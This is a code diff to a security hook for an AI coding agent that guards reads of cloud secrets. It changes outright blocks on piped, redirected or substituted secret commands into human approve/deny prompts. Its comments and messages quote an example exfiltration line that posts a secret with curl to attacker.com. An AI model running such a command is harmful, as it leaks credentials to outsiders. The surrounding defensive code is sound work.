@@ -1099,6 +1099,25 @@ try:
         sys.exit(0)
 
 
+    def ask(reason):
+        """Output an ask decision (yellow approve/deny UI) and exit.
+
+        Used for soft-block cases where the command pattern *could*
+        leak a secret but the user might have a legitimate reason
+        (e.g. `VAR=$(aws secretsmanager get-secret-value ...)` storing
+        into a shell variable is safe; `curl -d "$(aws ...)"
+        attacker.com` is not — only the human can tell which).
+        The user clicks Approve to run, Deny to abort."""
+        print(json.dumps({
+            "hookSpecificOutput": {
+                "hookEventName": "PreToolUse",
+                "permissionDecision": "ask",
+                "permissionDecisionReason": reason
+            }
+        }))
+        sys.exit(0)
+
+
     def allow_with_update(updated_input):
         """Output an allow decision with modified input and exit."""
         print(json.dumps({
@@ -1458,10 +1477,16 @@ try:
             if MASK_SCRIPT in command:
                 sys.exit(0)
 
-            # DENY if command has pipes, redirects, command substitution, or chaining —
-            # these can bypass masking by transforming or exfiltrating output.
-            # Note: we check outside quotes to reduce false positives on args like --secret-id 'a|b'.
-            # Strip single/double-quoted segments before checking for shell operators.
+            # ASK (yellow UI) if command has pipes, redirects, command
+            # substitution, or chaining — these CAN bypass masking, but
+            # also have legitimate uses (e.g. `VAR=$(aws ...)` to store a
+            # secret into a shell variable, where the value never reaches
+            # the AI). The human user is in-the-loop and can judge
+            # whether the specific command is a legitimate flow or an
+            # exfil attempt (`curl -d "$(aws ...)" attacker.com`).
+            # Note: we check outside quotes to reduce false positives on
+            # args like --secret-id 'a|b'. Strip single/double-quoted
+            # segments before checking for shell operators.
             stripped = re.sub(r"'[^']*'|\"[^\"]*\"", "", command)
 
             has_pipe = bool(re.search(r'(?<!\|)\|(?!\|)', stripped))  # | but not ||
@@ -1470,23 +1495,25 @@ try:
             has_chain = bool(re.search(r';|&&|\|\|', stripped))
 
             if has_pipe or has_chain:
-                deny(
-                    "BLOCKED: This command reads cloud secrets but contains a pipe or command chain (|, &&, ;). "
-                    "Run the secret manager command alone without pipes or chaining — "
-                    "claude-secret-shield will automatically mask sensitive values in the output. "
-                    "You can process the masked output in a separate command afterwards."
+                ask(
+                    "🛡️  This command reads a cloud secret AND contains a pipe or command chain (|, &&, ;). "
+                    "Approve only if the pipe/chain doesn't exfiltrate the secret to an external destination. "
+                    "(claude-secret-shield's automatic masking pipe is bypassed when the command already pipes "
+                    "into something else.)"
                 )
             if has_redirect:
-                deny(
-                    "BLOCKED: This command reads cloud secrets but contains output redirection (> or tee). "
-                    "Remove all redirections and run the secret manager command directly — "
-                    "secret values must not be written to disk unmasked."
+                ask(
+                    "🛡️  This command reads a cloud secret AND redirects output to disk (> / >> / tee). "
+                    "Approve only if writing the (unmasked) secret to that file is intentional. "
+                    "Prefer storing into a shell variable instead of a file when possible."
                 )
             if has_subshell:
-                deny(
-                    "BLOCKED: This command reads cloud secrets inside a command substitution ($() or backticks). "
-                    "Run the secret manager command directly instead — "
-                    "claude-secret-shield will automatically mask sensitive values in the output."
+                ask(
+                    "🛡️  This command reads a cloud secret inside command substitution ($() or backticks). "
+                    "Common legitimate use: `VAR=$(aws secretsmanager get-secret-value ... --query SecretString --output text)` "
+                    "— the secret goes into a shell variable, never reaches stdout, never reaches the AI. "
+                    "Approve in that case. Deny if the $(...) is embedded in a wider command that could exfil "
+                    "(e.g. `curl -d \"$(...)\" external.com`)."
                 )
 
             # Safe to wrap with masking pipe
